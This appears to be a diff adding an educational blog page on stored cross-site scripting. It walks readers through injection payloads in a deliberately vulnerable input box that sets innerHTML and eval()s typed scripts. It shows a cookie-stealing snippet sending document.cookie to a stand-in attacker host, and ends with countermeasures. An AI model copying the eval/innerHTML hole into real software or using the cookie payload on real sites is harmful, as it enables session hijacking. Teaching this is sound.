@@ -1,0 +1,161 @@
+<!-- Take a look at this simple input box above. You probably have seen many of them today when logging into facebook, searching for viral videos on youtube or googling "what's for dinner around San Diego". It's just such a commonplace and ugly input box that you wouldn't bother clicking on it if I don't ask you to. -->
+<!-- study-notes -->
+<style>
+    #input-root {text-align:center;margin:0 0 50px 0;}
+    #input-box {padding:3px 5px;font-size:1em;width:60%;}
+    #input-feed {width:60%;margin:10px auto;}
+    #input-feed > div {border-bottom:2px #636363 dashed;font-size:1em;font-weight:bold;text-align:left;}
+    #input-feed > div:last-child {border-bottom:none;}
+    #input-feed > div > a {color:#636363;text-decoration-line:underline;}
+    img {width:100%;text-align:center;}
+    iframe {margin-left:-25%;width:150%;height:500px;}
+</style>
+<div id='content-wrapper'>
+    <div id='content'>
+        <h1>XSS Attack</h1>
+        <p id='content-date'>Aug. 27, 2020, 00:15:10</p>
+
+        <div id='input-root'>
+            <input type='text' id='input-box' placeholder='A happy little input box'>
+            <div id='input-feed'></div>
+        </div>
+
+        <p>
+            Take a look at this simple input box above. You probably have seen many of them today when logging into facebook, searching for viral videos on youtube or googling "what's for dinner around San Diego". It's just such a commonplace and ugly input box that you wouldn't bother clicking on it if I don't ask you to.
+        </p>
+        <p>
+            Now, I do ask you to type something and hit enter like you did so many times today (if you have no idea what to write, just answer "How are you today?").
+        </p>
+        <p>
+            You should see the content of what you just entered appeared below. Go ahead and try more if you like. Basically, it's just taking whatever you enter and adding it to the webpage.
+        </p>
+
+        <h2>Step 1 - Insert Image</h2>
+        <p>
+            Now let's have some fun - copy this line to the input and hit enter:<br>
+            <icode>&lt;img src='../imgs/ARP-6.png'/&gt;</icode>
+        </p>
+        <p>
+            Surprise! You saw an image from my <a href='Experimenting with ARP Poisoning Attack.html'>previous post</a> on ARP poisoning attack. The previous line of code is specifying an HTML image element. Since the input box is just taking whatever in the text box and add to the webpage's HTML file, the browser will falsely parse this image element as a request to fetch that image and show it here.
+        </p>
+        <p>
+            This is a vulnerability of the webpage that can be exploited by malicious users to, say for example, insert unwanted images, texts, even other webpage's URLs without consent from the webpage maker. The consequence of those acts really depends on the content being inserted. A cute cat picture is far more benign than a purposefully crafted phishing site's URL. As a example, try this line:<br>
+            <icode>&lt;a href='https://google.com'&gt;It's really just Google.&lt;/a&gt;</icode>
+        </p>
+        <p>
+            Now I've whetted your appetite. Let's move on.
+        </p>
+
+        <h2>Step 2 - Insert Webpage</h2>
+        <p>
+            Let's up the game a little bit. What if instead of just hiding a malicious link among a mire of links on a regular webpage and hoping a victim can see it, I forcefully bring the webpage to you? Try this line:<br>
+            <icode>&lt;iframe src='index.html'/&gt;</icode>
+        </p>
+        <p>
+            Yes! You can access a webpage within another webpage. It's the exact same page you see if you type the URL in a browser.
+        </p>
+        <p>
+            Now the problem starts to show itself. Just with the ability to inject random code onto a page, one can overwrite the whole page's information without user noticing. No things on a webpage is safe from being replaced or erased. Regular users can be easily tricked to click on malicous links or login with credentials on a fake website.
+        </p>
+        <p>
+            Scary, isn't it? But there's more to come.
+        </p>
+
+        <h2>Step 3 - Insert JS</h2>
+        <p>
+            In the previous 2 steps, we are only tinkering with static information on a webpage, specifically HTML elements. HTML only dictates the fixed information about a page, like what font to use, what color is the background, what image to present, etc. However, the real heart and soul of an interactive webpage lies in Javascript (JS).
+        </p>
+        <p>
+            Javascript offers the ability to dynamically change a webpage's content based on events. The input box you've been using on the top of this page has corresponding JS code associated with it. When you hit enter, you triggered an event that was captured by JS and some simple manipulation was done to append what you had just entered in the input box to the area below.
+        </p>
+        <p>
+            JS is really powerful, almost all things you see and can't see on a webpage can be modified by JS. Try this and you will get an alert after 5 seconds:<br>
+            <icode>&lt;script&gt;setTimeout(function(){alert("Alert!");}, 5000);&lt;/script&gt;</icode><br><br>
+            Or if you prefer, count down from 10 simulating human input:<br>
+            <icode>&lt;script&gt;var b=document.getElementById("input-box");var i=10;function countDown(){b.value=""+(i--);var e=new KeyboardEvent("keyup",{bubbles:true,cancelable:true,keyCode:13});b.dispatchEvent(e);if(i&gt;=0) setTimeout(countDown, 1000);}setTimeout(countDown, 1000);&lt;/script&gt;</icode><br>
+        </p>
+
+        <h2>Step 4 - XSS Attack</h2>
+        <p>
+            Now down to the real meat of our XSS discussion. "XSS Attack" is the acronym for "Cross-Site Scripting Attack".
+        </p>
+        <p>
+            The essense of XSS Attack is to insert some JS code into a webpage and get it to run on the victim's browser. The goal is to either trick the user into clicking some link, or to secretly send user's data to attacker from the victim's machine. In most cases, it starts with inserting code to a website, which the server preserves. Then the server presents the saved information, together with malicious code, to the next user who access that same webpage. A real-life example would be any chat sections of a website, where posting and sharing is very common.
+        </p>
+
+        <br>
+        <p style='border:2px dashed #636363;padding: 2px 5px;'>
+            <b>Update</b>: This post covers only a subtype of XSS attacks called "Stored XSS Attack". The other type is "Reflective XSS Attack".
+        </p>
+        <br>
+
+        <p>
+            The examples I presented before all are examples of such XSS attacks, but they are clearly harmless ones (and they are not persistent which means they can only run on your browser). However, in real life commercial websites, there are certainly more harmful attacks present. For example, let's take a look at "cookie stealing" which employs XSS techniques.
+        </p>
+        <p>
+            Attacker starts by injecting JS code similar to this:
+        </p>
+        <ul class='ccode'>
+            <li><pre>&lt;script&gt;</pre></li>
+            <li><pre>    <span style='color:#2196f3'>var</span> fakeImage = document.<span style='color:#ffeb3b'>createElement</span>(<span style='color:#d8721a'>"img"</span>);</pre></li>
+            <li><pre>    fakeImage.src = <span style='color:#d8721a'>"attacker_owned_website.com/image.png?cookie="</span> + document.cookie;</pre></li>
+            <li><pre>    document.<span style='color:#ffeb3b'>appendChild</span>(fakeImage);</pre></li>
+            <li><pre>&lt;script&gt;</pre></li>
+        </ul>
+        <p>
+            On first sight, it may seem this code is requesting an image from another server, which is a very common thing to do. No matter what that image is, or whether the request will succeed or not, the trick here is not about the image, but the request itself. This seemingly simple request has the user's cookie concatenated to the requesting URL. So, when a user browses to the infected website with this piece of code in it, the browser will automatically try to fetch this image from the attacker's server while sending the user's cookie along with it.
+        </p>
+        <p>
+            Since a user's cookie in many cases is the only thing that a server uses to validate the current user is indeed who he/she claims to be, the attacker can impersonate as the victim by using his/her cookie. If that stealed cookie happens to be linked to the victim's bank account or social media account, then it's up to the attacker's mercy to do whatever things he wants as he now has access to them. I recommend <a href="https://www.youtube.com/watch?v=T1QEs3mdJoc">Computerphile's video</a> in compensate to my terse explaination.
+        </p>
+
+        <h2>Countermeasures</h2>
+        <p>
+            I have to say the examples I give in this post are only for demonstration and they are highly limited. Because XSS is such a well-known type of attack, there are many countermeasures installed at many levels to protect user privacy.
+        </p>
+        <p>
+            Let's start with the most basic and effective countermeasure - the "Same-origin Policy". To my limited undertanding of this policy, it dictates that resources and scripts retrieved from different origins (from different servers, ports, etc) should not be able to share sensitive information with one another. So cookies will not be shared between two distinct sites. In addition, including images from other websites can also be restricted by detecting and comparing their sources as the image shown below.
+        </p>
+
+        <div class='img-txt'>
+            <img src='../imgs/Cross-Origin_Block.png' />
+            <h3>Error giving by Chrome when trying to include a Chrome logo image from Wikipedia</h3>
+        </div>
+
+        <br>
+        <p>
+            Then as another layer of protection, modern commercial websites have highly adequate Risk Control/Management Systems that captures and stops identity theft in action. They use trained models to capture the real user's behavior and once they found the current action is out of character, like logging in from a different location or with a different device, then more secure credentials (like the user's login password) are required to confirm the user's identity to proceed with the action.
+        </p>
+
+        <h3>Useful Links/References:</h3>
+        <p>
+            <a href='https://owasp.org/www-community/attacks/xss/'>XSS Post by OWASP</a><br>
+            <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS Wiki</a><br>
+            <a href='https://www.youtube.com/watch?v=T1QEs3mdJoc'>Cookie Stealing by Computerphile</a><br>
+            <a href='https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#:~:text=Cross%2Dorigin%20script%20API%20access,JavaScript%20APIs%20like%20iframe.&text=When%20two%20documents%20do%20not,postMessage%20.'>Same-Origin Policy by Mozilla</a><br>
+            <a href='https://www.w3.org/Security/wiki/Same_Origin_Policy'>Same-Origin Policy by W3C</a><br>
+        </p>
+    </div>
+</div>
+
+<script>
+    var input = document.getElementById("input-box");
+    var feed = document.getElementById("input-feed");
+    var command = "";
+    input.addEventListener("keyup", function(e) {
+        if(e.key === 'Enter' || e.keyCode === 13) {
+            var newFeed = document.createElement("div");
+            var inputContent = input.value;
+            if(inputContent.includes("<script")) {
+                command = inputContent.substring(inputContent.indexOf(">")+1, inputContent.indexOf("</"));
+                newFeed.innerHTML = "Script detected: " + command + inputContent;
+                // Force running js immediately, in real life, this is done on reload of file with the script section
+                eval(command);
+            } else {
+                newFeed.innerHTML = input.value;
+            }
+            feed.appendChild(newFeed);
+            input.value = "";
+        }
+    });            
+</script>
